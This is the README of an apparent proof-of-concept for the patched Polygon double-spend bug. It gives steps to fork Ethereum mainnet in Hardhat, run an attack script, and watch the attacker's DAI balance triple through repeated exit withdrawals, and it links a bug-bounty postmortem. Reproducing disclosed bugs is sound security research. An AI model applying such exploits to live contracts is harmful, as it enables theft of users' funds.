# Polygon double spend vulnerable PoC

## How to run

Install nodejs/npm first

Set up the `forking url` (in `hardhat.config.ts`)

e.g. https://speedy-nodes-nyc.moralis.io/xxxxxxxxxxx/eth/mainnet/archive (
You need to apply for speedy-nodes from moralis.io)

Then run
```bash
npm install
npx hardhat run scripts/attack.ts
```
You will see similar output later
```
------ Exploit: verifyInclusion byte discard bug ------------
Dai balance of attacker: 0.0
------> Step 1: call processExits() to make a normal withdrawal
Dai balance of attacker: 33000.0
------> Step 2: call startExitWithBurntTokens() repeatedly to mint ExitNFT
7 days have passed
------> Step 3: call processExits() to make multiple withdrawals
Dai balance of attacker: 99000.0
```
This means the attack is complete
> The block height of the fork is 13260334


## Link

* https://medium.com/immunefi/polygon-double-spend-bug-fix-postmortem-2m-bounty-5a1db09db7f1
* https://www.tofreedom.me/polygonmatic
